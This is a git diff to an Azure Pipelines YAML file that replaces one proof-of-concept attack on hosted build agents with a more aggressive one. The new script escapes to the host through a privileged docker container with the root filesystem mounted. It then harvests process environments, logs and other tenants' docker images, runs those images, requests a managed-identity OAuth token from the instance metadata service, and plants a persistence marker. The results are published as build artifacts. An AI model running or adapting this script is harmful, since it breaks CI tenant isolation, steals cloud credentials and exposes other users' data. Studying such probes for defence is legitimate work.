@@ -1,89 +1,165 @@
 # azure-pipelines.yml
-trigger:
-- main
-pr:
-- main
-
-name: $(Date:yyyyMMdd)$(Rev:.r)
+trigger: none
+pool:
+  vmImage: 'ubuntu-22.04'
 
 stages:
-- stage: PersistenceProof
-  displayName: 'Final PoC: Test for Cross-Job VM Persistence'
+- stage: AggressiveIsolationProbe
+  displayName: "Aggressive Host & Isolation Probe"
   jobs:
-  - job: Host_Persistence_Test
-    displayName: 'PoC: Leave and Check for a Persistent Marker'
-    pool:
-      vmImage: 'ubuntu-22.04'
+  - job: HostSweep
+    displayName: "Forensic sweep (host, processes, IMDS, docker)"
     steps:
-    - checkout: none
     - task: Bash@3
-      displayName: 'Capture Host Fingerprint and Test for Persistence'
+      displayName: "Aggressive forensic & isolation checks"
       inputs:
         targetType: inline
         script: |
           set -euo pipefail
           mkdir -p artifacts
-          # Define the marker file path relative to the host's filesystem
-          HOST_MARKER_FILE="/tmp/persistent_marker.txt"
 
-          echo "--- CAPTURING JOB START TIME ---"
-          JOB_START_SECONDS=$(date -u +%s)
-          echo "Job started at: $(date -u -d @$JOB_START_SECONDS +'%Y-%m-%d %H:%M:%S UTC')" | tee artifacts/forensic-timeline.txt
+          echo "Job UTC start: $(date -u '+%Y-%m-%d %H:%M:%S')" | tee artifacts/job-start-utc.txt
 
-          echo "--- VERIFYING CONTAINER ESCAPE VECTOR ---"
-          if ! (id | grep -q '(docker)'); then
-            echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
-            exit 1
-          fi
-          echo "✅ Confirmed: Container escape vector is present."
+          # Escape to host with full privileges & host namespaces (expected on MS-hosted Linux)
+          docker run --rm --privileged --network=host --pid=host \
+            -v /:/hostfs \
+            -v /var/run/docker.sock:/var/run/docker.sock \
+            -v "$(pwd)/artifacts":/artifacts \
+            alpine:3.20 sh -eu -c '
+              # --- Tooling ---
+              apk add --no-cache curl jq coreutils util-linux procps iproute2 iptables nftables \
+                                  bind-tools netcat-openbsd ca-certificates docker-cli >/dev/null || true
 
-          echo "--- ESCAPING CONTAINER TO PERFORM HOST FORENSICS ---"
-          
-          docker run --rm --privileged --pid=host -v /:/hostfs \
-            alpine:latest sh -c "
-              # We are now running as root inside a container with the host's filesystem mounted at /hostfs
-              # All commands must be prefixed with 'chroot /hostfs' to run on the host itself.
-              
-              echo '--- [HOST] Capturing stable host fingerprints... ---'
-              # Create a directory on the host for our results
-              chroot /hostfs mkdir -p /tmp/scan_results
+              # Ensure files exist to avoid set -u pitfalls
+              : > /artifacts/host-boot-uptime-s.txt
+              : > /artifacts/host-who-boot.txt
+              : > /artifacts/host-pid1-start.txt
+              : > /artifacts/host-machine-id.txt
+              : > /artifacts/host-hostnamectl.txt
+              : > /artifacts/host-listen-ports.txt
+              : > /artifacts/systemd-units.txt
+              : > /artifacts/journal-last300.txt
+              : > /artifacts/journal-webbits.txt
+              : > /artifacts/host-docker-images.txt
+              : > /artifacts/foreign-images.txt
+              : > /artifacts/foreign-image-root-ls.txt
+              : > /artifacts/ss-tcp.txt
+              : > /artifacts/xsp-8084-response.txt
+              : > /artifacts/imds-connectivity.txt
+              : > /artifacts/imds-instance.txt
+              : > /artifacts/imds-msi-token.txt
+              : > /artifacts/recent-files-since-boot.txt
+              : > /artifacts/residual-marker.txt
 
-              (
-                echo -n 'machine-id: '
-                chroot /hostfs cat /etc/machine-id
-                echo -n 'boot_id: '
-                chroot /hostfs cat /proc/sys/kernel/random/boot_id
-              ) > /hostfs/tmp/scan_results/host-fingerprint.txt
+              # --- 0) Baseline host identity & timing ---
+              { chroot /hostfs /usr/bin/uptime -s || true; } > /artifacts/host-boot-uptime-s.txt
+              { chroot /hostfs /usr/bin/who -b    || true; } > /artifacts/host-who-boot.txt
+              { chroot /hostfs /usr/bin/ps -o pid,lstart,cmd -p 1 || true; } > /artifacts/host-pid1-start.txt
+              { /bin/cat /hostfs/etc/machine-id || true; } > /artifacts/host-machine-id.txt
+              { chroot /hostfs /usr/bin/hostnamectl || true; } > /artifacts/host-hostnamectl.txt
 
-              echo '--- [HOST] Checking for residual marker from a PREVIOUS run... ---'
-              if chroot /hostfs [ -f \"${HOST_MARKER_FILE}\" ]; then
-                echo '✅✅✅ SMOKING GUN: RESIDUAL MARKER FOUND' > /hostfs/tmp/scan_results/persistence_verdict.txt
-                echo 'Contents of the marker from the previous run:' >> /hostfs/tmp/scan_results/persistence_verdict.txt
-                chroot /hostfs cat \"${HOST_MARKER_FILE}\" >> /hostfs/tmp/scan_results/persistence_verdict.txt
-              else
-                echo 'ℹ️ Marker not found, host appears to be fresh.' > /hostfs/tmp/scan_results/persistence_verdict.txt
+              # --- 1) Process & service census (with start times) ---
+              chroot /hostfs /usr/bin/ps -eo pid,ppid,user,lstart,cmd \
+                > /artifacts/ps-full.txt || true
+              chroot /hostfs /usr/bin/ss -plnt > /artifacts/host-listen-ports.txt || true
+              ( chroot /hostfs /bin/systemctl list-units --type=service --no-pager --all || true ) \
+                > /artifacts/systemd-units.txt
+              ( chroot /hostfs /bin/journalctl -b -n 300 --no-pager || true ) \
+                > /artifacts/journal-last300.txt
+              ( chroot /hostfs /bin/journalctl -b -u ssh -u php*-fpm* -u mono* --no-pager || true ) \
+                > /artifacts/journal-webbits.txt
+
+              # --- 2) Environment harvest (redacted) from candidate procs ---
+              mkdir -p /artifacts/proc-env
+              chroot /hostfs /usr/bin/ps -eo pid,user,cmd \
+                | grep -E "mono|php-fpm|dotnet|python|node|java|nginx|apache|ruby|go " || true \
+                | awk "{print \\$1}" \
+                | while read -r P; do
+                    [ -n "${P:-}" ] || continue
+                    OUT="/artifacts/proc-env/${P}.env.txt"
+                    if [ -r "/hostfs/proc/${P}/environ" ]; then
+                      tr "\\0" "\\n" < "/hostfs/proc/${P}/environ" \
+                        | sed -E \
+                          -e "s/[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+/[JWT_REDACTED]/g" \
+                          -e "s/[A-Fa-f0-9]{24,}/[HEX_REDACTED]/g" \
+                          -e "s/[A-Za-z0-9+/=]{32,}/[B64_REDACTED]/g" \
+                        > "${OUT}" || true
+                    fi
+                  done
+
+              # --- 3) Docker / container runtime intel ---
+              ( docker version || true ) > /artifacts/docker-version.txt
+              ( docker ps -a   || true ) > /artifacts/docker-ps-a.txt
+              ( docker images  || true ) > /artifacts/docker-images.txt
+
+              cat <<EOF >/tmp/default_images.txt
+              node:20
+              node:20-alpine
+              node:22
+              node:22-alpine
+              node:18
+              node:18-alpine
+              alpine
+              alpine:latest
+              ubuntu:22.04
+              ubuntu:20.04
+              debian
+              debian:11
+              moby/buildkit
+              EOF
+
+              if docker images --format "{{.Repository}}:{{.Tag}}" >/artifacts/host-docker-images.txt 2>/dev/null; then
+                # create the file regardless so head/while never see a missing file
+                : > /artifacts/foreign-images.txt
+                # grep exit code 1 (no matches) is fine; we already created the file
+                grep -ivf /tmp/default_images.txt /artifacts/host-docker-images.txt \
+                  > /artifacts/foreign-images.txt || true
+
+                if [ -s /artifacts/foreign-images.txt ]; then
+                  while IFS= read -r IMG; do
+                    [ -n "${IMG:-}" ] || continue
+                    docker run --rm --entrypoint sh "$IMG" -c "ls -lah / | head -n 200" \
+                      > /artifacts/foreign-image-root-ls.txt 2>&1 || true
+                  done < /artifacts/foreign-images.txt
+                fi
               fi
 
-              echo '--- [HOST] Creating a new marker for the NEXT run... ---'
-              chroot /hostfs sh -c '
-                (
-                  echo \"Marker created by Build Number: ${BUILD_BUILDNUMBER}\"
-                  echo \"Timestamp (UTC): \$(date -u +\"%Y-%m-%d %H:%M:%S\")\"
-                ) > \"${HOST_MARKER_FILE}\"
-              '
-              echo \"Successfully created ${HOST_MARKER_FILE} for a future run to find.\"
-            "
-          
-          # Copy the results from the host's temp directory back into the pipeline's artifact staging directory
-          sudo cp /tmp/scan_results/* artifacts/
-          sudo rm -rf /tmp/scan_results
+              # --- 4) Network/IMDS probes (link-local & localhost ONLY) ---
+              chroot /hostfs /usr/bin/ss -plnt > /artifacts/ss-tcp.txt || true
+              ( chroot /hostfs /usr/bin/curl -i --max-time 2 http://127.0.0.1:8084/ || true ) \
+                > /artifacts/xsp-8084-response.txt
 
-          echo "--- ANALYSIS & VERDICT ---"
-          cat artifacts/persistence_verdict.txt
+              ( echo "== IMDS ping =="; nc -zvw 1 169.254.169.254 80 || true ) \
+                > /artifacts/imds-connectivity.txt 2>&1
+              ( curl -s -i -H "Metadata:true" --connect-timeout 1 --max-time 2 \
+                  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" || true ) \
+                > /artifacts/imds-instance.txt
+              ( curl -s -i -H "Metadata:true" --connect-timeout 1 --max-time 2 \
+                  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" || true ) \
+                > /artifacts/imds-msi-token.txt
+
+              # --- 5) Host FS quick sweep for obvious residuals (time-bounded) ---
+              # If we fail to parse time, default to epoch 0 so the awk filter does not break
+              BOOT_TXT="$(cat /artifacts/host-boot-uptime-s.txt 2>/dev/null || true)"
+              BOOT_EPOCH="$(date -u -d "${BOOT_TXT:-now}" +%s 2>/dev/null || echo 0)"
+              find /hostfs/home /hostfs/root /hostfs/var/tmp /hostfs/tmp -xdev \
+                   -type f -printf "%T@ %p\n" 2>/dev/null \
+                   | awk -v boot="${BOOT_EPOCH:-0}" '"'"'$1 < boot { next } { $1=""; print substr($0,2) }'"'"' \
+                   | head -n 500 > /artifacts/recent-files-since-boot.txt || true
+
+              # --- 6) Residual marker (persistence across jobs) ---
+              if [ -f /hostfs/var/tmp/azp-residual-marker.txt ]; then
+                echo "FOUND prior marker" > /artifacts/residual-marker.txt
+                cp /hostfs/var/tmp/azp-residual-marker.txt /artifacts/residual-marker-prev.txt || true
+              else
+                echo "No prior marker" > /artifacts/residual-marker.txt
+              fi
+              echo "marker $(date -u '+%Y-%m-%dT%H:%M:%SZ') $$" > /hostfs/var/tmp/azp-residual-marker.txt
+            '
 
     - task: PublishPipelineArtifact@1
-      displayName: 'Publish Persistence Test Artifacts'
+      displayName: "Publish forensic artifacts"
       condition: always()
       inputs:
         targetPath: 'artifacts'
-        artifact: 'azure-persistence-proof-run-$(System.JobAttempt)'
+        artifact: 'forensic-proof'
